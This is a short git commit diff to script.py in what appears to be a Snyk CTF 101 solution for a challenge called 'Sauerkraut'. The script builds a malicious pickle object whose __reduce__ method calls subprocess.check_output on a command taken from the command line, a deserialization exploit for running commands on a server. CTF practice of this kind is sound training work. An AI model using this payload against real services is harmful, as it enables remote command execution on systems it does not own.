b8e9ae93fdfc4bc7182d2330101454147b87b5f0
Emanuele Picariello <emanuelepicariello97@gmail.com>
2022-05-02 20:49:21 -0400

    clean and correction script.py

--- Snyk-CTF-101/Sauerkraut/script.py
+++ Snyk-CTF-101/Sauerkraut/script.py
@@ -9,13 +9,7 @@ class PICKLEREQUEST():
                 self.cmd = cmd
          
         def __reduce__(self):
-                    return (subprocess.check_output, ([*self.cmd.split(' '),],))
-        def command64(self, cmdsplit):
-                    pickled = pickle.dumps(cmdsplit)
-                    self.string64 = base64.urlsafe_b64encode(pickled)
-        def get_string64(self):
-            print (self.string64)
-            
+            return (subprocess.check_output, ([*self.cmd.split(' '),],))
                     
 
 command = sys.argv[1]
